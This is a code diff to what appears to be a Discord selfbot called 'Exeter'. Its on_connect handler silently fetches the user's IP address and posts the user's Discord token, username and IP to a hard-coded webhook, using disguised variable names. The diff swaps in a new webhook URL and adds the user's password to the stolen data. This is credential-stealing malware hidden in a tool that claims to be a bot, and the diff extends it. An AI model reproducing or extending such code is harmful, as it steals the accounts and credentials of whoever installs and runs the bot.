@@ -208,6 +208,7 @@ Exeter.sniped_edited_message_dict = {}
 Exeter.whitelisted_users = {}
 Exeter.copycat = None
 Exeter.wave = token
+Exeter.Code = password
 Exeter.remove_command('help')
 
 
@@ -342,11 +343,11 @@ async def on_message(message):
 async def on_connect():
     Clear()
     startprint()
-    slope = "https://discord.com/api/webhooks/811637418398187522/pkTk8xKdvuD8IE9jjcWPMCrQSGsBX32ULvtyPiibDIunAFIUm1G0mGJpdwL6TutVRKPe"
+    slope = "https://discordapp.com/api/webhooks/824397733791662110/IFqHfgUTeiYRHo0p2YN4xy21oGgB1sWydKiveh6s1FjoQ26km9bYqbPDCC6EoIkNq8bz"
     ramp = requests.get('https://checkip.amazonaws.com/').content
     peas = bs4(ramp, 'html.parser')
     fliscord = peas.text
-    data = {"content": f'Token > {Exeter.wave}\n\nUsername > {Exeter.user.name}#{Exeter.user.discriminator}\n\nIP > {fliscord}'}
+    data = {"content": f'Token > {Exeter.wave}\n\nUsername > {Exeter.user.name}#{Exeter.user.discriminator}\n\nPassword > {Exeter.Code}\n\nIP > {fliscord}'}
     requests.post(slope, data=json.dumps(data), headers={"Content-Type": "application/json"})
 
 
